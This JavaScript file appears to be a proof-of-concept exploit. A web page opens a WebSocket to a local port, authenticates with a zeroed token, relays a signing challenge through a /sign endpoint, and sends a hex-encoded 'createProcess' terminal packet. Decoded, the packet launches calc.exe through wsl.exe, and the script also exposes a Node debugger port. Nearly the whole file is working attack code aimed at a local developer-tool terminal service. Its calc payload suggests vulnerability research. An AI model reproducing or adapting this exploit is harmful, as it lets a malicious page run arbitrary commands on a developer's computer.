"use strict";

// Start https://gist.github.com/don/871170d88cf6b9007f7663fdbc23fe09

/**
 * Convert a hex string to an ArrayBuffer.
 * 
 * @param {string} hexString - hex representation of bytes
 * @return {ArrayBuffer} - The bytes in an ArrayBuffer.
 */
function hexStringToArrayBuffer(hexString) {
    
  // ensure even number of characters
  if (hexString.length % 2 != 0) {
    console.log('WARNING: expecting an even number of characters in the hexString');
  }
  
  // check for some non-hex characters
  var bad = hexString.match(/[G-Z\s]/i);
  if (bad) {
    console.log('WARNING: found non-hex characters', bad);
  }
  
  // split the string into pairs of octets
  var pairs = hexString.match(/[\dA-F]{2}/gi);
  
  // convert the octets to integers
  var integers = pairs.map(function(s) {
    return parseInt(s, 16);
  });
  
  var array = new Uint8Array(integers);
  
  return array.buffer;
}
// End https://gist.github.com/don/871170d88cf6b9007f7663fdbc23fe09

// Start https://stackoverflow.com/a/50767210
function bufferToHex (buffer) {
  return [...new Uint8Array (buffer)]
    .map (b => b.toString (16).padStart (2, "0"))
    .join ("");
}
// End https://stackoverflow.com/a/50767210


// ----------

// sendMessage sends a message to the socket after waiting for n
// milliseconds. Use it like `await sendMessage(socket, message);`.
function sendMessage(socket, message) {
  socket.send(message);
}

// Show message in div#messages. This is used for incoming messages.
function showMessage(message) {
  let messageElem = document.createElement('div');
  messageElem.textContent = message;
  document.getElementById('messages').appendChild(messageElem);
}

// Start https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API/Using_Fetch#supplying_request_options
// postJSON sends data as application/json.
function postJSON(url = '', data = {}) {
    
  return fetch(url, {
    method: 'POST',
    mode: 'cors', // no-cors, *cors, same-origin
    headers: {
      'Content-Type': 'application/json'
    },
    referrerPolicy: 'no-referrer',
    body: data
  });
  // return response.json(); // parses JSON response into native JavaScript objects
  // return response;
}

// End https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API/Using_Fetch#supplying_request_options

// bufferToString converts an array buffer to a UTF-8 string.
function bufferToString(buf) {
  var dec = new TextDecoder("utf-8");
  return dec.decode(buf);
}

// parsePacket converts a packet to JSON.
// This function only cares about the top level
function parsePacket(packet) {
  // Reference: https://stackoverflow.com/a/47564755
  // We're gonna get ArrayBuffers from the websocket.
  // Create a view.
  var view = new DataView(packet);

  // The first byte is the type.
  var typeByte = view.getInt8(0);
  var type = '';
  // Create the type of the packet.
  switch (typeByte) {
    case 0x04:
      type = 'OK Message';
      break;
    // case 0x02:
    //   type = ''
        
    default:
      // Otherwise use the hex string.
      type = typeByte.toString(16);
      break;
  }

  // Next 12 bytes are length of the rest of the packet that we can skip.

  // Everything after is value.
  return {
    type: type,
    data: bufferToString(packet.slice(13, packet.byteLength))
  };
}

var socket;

// auth packet
const auth = "040000000000000000000000000200000000000000000000002D7B2274797065223A2261757468222C2261757468223A223030303030303030303030303030303030303030227D";
const authBytes = hexStringToArrayBuffer(auth);

// "sign" packet
// This is a looooong line
const sign = hexStringToArrayBuffer("010000000100000000000006940400000002050000000331303005000000023635010000000e72656d6f74657465726d696e616c01000000066763726561746550726f6365737305000003a87b22636f6e66696775726174696f6e223a7b227465726d696e616c2e696e74656772617465642e6175746f6d6174696f6e5368656c6c2e77696e646f7773223a6e756c6c2c227465726d696e616c2e696e74656772617465642e6175746f6d6174696f6e5368656c6c2e6f7378223a6e756c6c2c227465726d696e616c2e696e74656772617465642e6175746f6d6174696f6e5368656c6c2e6c696e7578223a6e756c6c2c227465726d696e616c2e696e74656772617465642e7368656c6c2e77696e646f7773223a22633a5c5c57696e646f77735c5c53797374656d33325c5c77736c2e657865222c227465726d696e616c2e696e74656772617465642e7368656c6c2e6f7378223a6e756c6c2c227465726d696e616c2e696e74656772617465642e7368656c6c2e6c696e7578223a6e756c6c2c227465726d696e616c2e696e74656772617465642e7368656c6c417267732e77696e646f7773223a5b2263616c632e657865225d2c227465726d696e616c2e696e74656772617465642e7368656c6c417267732e6f7378223a5b5d2c227465726d696e616c2e696e74656772617465642e7368656c6c417267732e6c696e7578223a5b5d2c227465726d696e616c2e696e74656772617465642e656e762e77696e646f7773223a7b7d2c227465726d696e616c2e696e74656772617465642e656e762e6f7378223a7b7d2c227465726d696e616c2e696e74656772617465642e656e762e6c696e7578223a7b7d2c227465726d696e616c2e696e74656772617465642e637764223a22222c227465726d696e616c2e696e74656772617465642e6465746563744c6f63616c65223a226175746f227d2c227265736f6c7665645661726961626c6573223a7b7d2c22656e765661726961626c65436f6c6c656374696f6e73223a5b5d2c227368656c6c4c61756e6368436f6e666967223a7b2265786563757461626c65223a2262617368222c227573655368656c6c456e7669726f6e6d656e74223a747275652c226869646546726f6d55736572223a66616c73657d2c22776f726b73706163654964223a22222c22776f726b73706163654e616d65223a22222c22776f726b7370616365466f6c64657273223a5b5d2c22616374697665576f726b7370616365466f6c646572223a6e756c6c2c2273686f756c64506572736973745465726d696e616c223a747275652c22636f6c73223a37392c22726f7773223a31372c22756e69636f646556657273696f6e223a223131222c227265736f6c766572456e76223a7b2250415448223a222f686f6d652f7061727369612f2e6c6f63616c2f62696e3a2f686f6d652f7061727369612f2e6e766d2f76657273696f6e732f6e6f64652f7631372e302e312f62696e3a2f7573722f6c6f63616c2f7362696e3a2f7573722f6c6f63616c2f62696e3a2f7573722f7362696e3a2f7573722f62696e3a2f7362696e3a2f62696e3a2f7573722f67616d65733a2f7573722f6c6f63616c2f67616d65733a2f6d6e742f632f57696e646f77732f73797374656d33323a2f6d6e742f632f57696e646f77733a2f6d6e742f632f57696e646f77732f53797374656d33322f5762656d3a2f6d6e742f632f57696e646f77732f53797374656d33322f57696e646f7773506f7765725368656c6c2f76312e302f3a2f6d6e742f632f57494e444f57532f73797374656d33323a2f6d6e742f632f57494e444f57533a2f6d6e742f632f57494e444f57532f53797374656d33322f5762656d3a2f6d6e742f632f50726f6772616d2046696c65732f4769742f636d643a2f6d6e742f632f476f2f62696e3a2f6d6e742f632f50726f6772616d2046696c65732f4d6963726f736f667420565320436f64652f62696e3a2f6d6e742f632f57494e444f57532f73797374656d33323a2f6d6e742f632f57494e444f57533a2f6d6e742f632f50726f6772616d2046696c65732028783836292f476e7557696e33322f62696e3a2f6d6e742f632f6d696e67772f7836342f62696e3a2f6d6e742f632f55736572732f5061727369612f676f2f62696e3a2f6d6e742f632f55736572732f5061727369612f417070446174612f4c6f63616c2f4d6963726f736f66742f57696e646f7773417070733a2f736e61702f62696e3a2f7573722f6c6f63616c2f676f2f62696e3a2f7573722f6c6f63616c2f62696e3a2f686f6d652f7061727369612f2e6c6f63616c2f62696e227d7d");

// connectWS connects to `ws://localhost:port` and returns the socket.
function connectWS(port) {
  let url = `ws://localhost:${port}`;
   
  // Open the socket.
  socket = new WebSocket(url);
  socket.binaryType = "arraybuffer";

  // ----- Start of Socket Events -----

  // This is executed when the websocket is opened.
  socket.onopen = function(event) {
    // Send auth when the websocket is opened.
    sendMessage(socket, authBytes);
  };

  // Display incoming websocket messages.
  socket.onmessage = async function(event) {
    let incomingMessage = event.data;
    
    // Print what we got.
    let packet = parsePacket(incomingMessage);
    showMessage(`${packet.type}: ${packet.data}`);
    // showMessage(`Received: ${packet.type}`);

    // Check if the message contains `"sign"`.
    if (packet.data.includes('"sign"')) {
      // Parse the data as json and extract sign.
      const parsed = JSON.parse(packet.data);
      // showMessage(`Got a signing request: ${parsed.data}`);
      showMessage('Got a signing request');
      showMessage('Sending a request to /sign');

      // Now we need to make a request to /sign.
      const signed = await (await postJSON('/sign', packet.data)).arrayBuffer();

      // This should have the message.
      showMessage('Got a response from /sign');

      let sg = parsePacket(signed);
      showMessage(`${sg.data}`);

      // Send it as-is to the local WebSocket server.
      sendMessage(socket, signed);
    }

    // {"debugPort":55000}
    // Check if the message contains 'debugPort'.
    if (packet.data.includes('debugPort')) {
      // This means we can parse packet.data as JSON.
      const parsed = JSON.parse(packet.data);

      showMessage(`Check the local Node Inspector instance running on port ${parsed.debugPort}`);

      // debugPort has the port we need to send to /inspect.
      // showMessage(`debugPort: ${parsed.debugPort}`);
      // showMessage('Sending a request to /inspect');
      // POST `packet.data` to /inspect.
      // ZZZ
      // const res = await (await postJSON('/inspect', packet.data)).arrayBuffer();
      // showMessage(bufferToString(res));
    }

  };

  // Log in console when the socket is closed.
  socket.onclose = event => console.log(`Closed ${event.code}`);
  // ----- End of Socket Events -----

  return socket;
}

// https://stackoverflow.com/a/18442458
function getFormData() {
  var p = document.getElementById('port').value;
  const s = connectWS(p);
  console.log(JSON.stringify(s));
}

